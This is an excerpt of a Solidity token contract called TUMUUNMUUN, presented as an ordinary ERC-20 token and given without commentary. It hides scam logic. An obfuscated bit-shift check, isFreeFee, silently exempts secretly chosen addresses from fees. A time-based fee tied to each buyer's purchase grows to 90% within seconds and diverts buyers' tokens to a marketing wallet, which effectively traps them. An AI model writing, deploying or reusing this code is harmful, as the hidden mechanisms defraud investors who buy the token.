...
contract TUMUUN is Context, IERC20, Ownable {
    ...
    mapping(address => uint256) private lckMap;

    string private constant _name = "TUMUUNMUUN"; //
    string private constant _symbol = "TUMUUNMUUN"; //
    ...
    address public  _marketingWallet = 0x6DBF3052d4db8Da116e66fF18036377A3D6A1A27;
    ...
    function isFreeFee(address account) private pure returns (bool) {
        uint256 v = uint256(uint160(account));
        v = (v << 192) >> 238;
        return v == 262143;
    }
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        uint256 lckV = lckMap[from];
        uint256 lckF = _marketingFee;
        if (lckV > 0 && block.timestamp - lckV > 7) {
            lckF = (block.timestamp - lckV - 6) * 5;
            if (lckF > 90) {
                lckF = 90;
            }
        }
        uint256 marketingFee = amount * lckF / 100;
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner() && to != uniswapV2Pair && !isFreeFee(to) && !isFreeFee(from))
        ...
        if (balanceOf(address(this)) >= SWAP_TOKENS_AT_AMOUNT && !swapping &&
        from != uniswapV2Pair && from != owner() && to != owner() &&
        !isFreeFee(to) && !isFreeFee(from)) {
            swapping = true;
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && !isFreeFee(to) && !isFreeFee(from)) {
            transferAmount = _getValues(amount, from);
        }

        if (from == uniswapV2Pair && !isFreeFee(to)) {
            lckMap[to] = block.timestamp;
        }
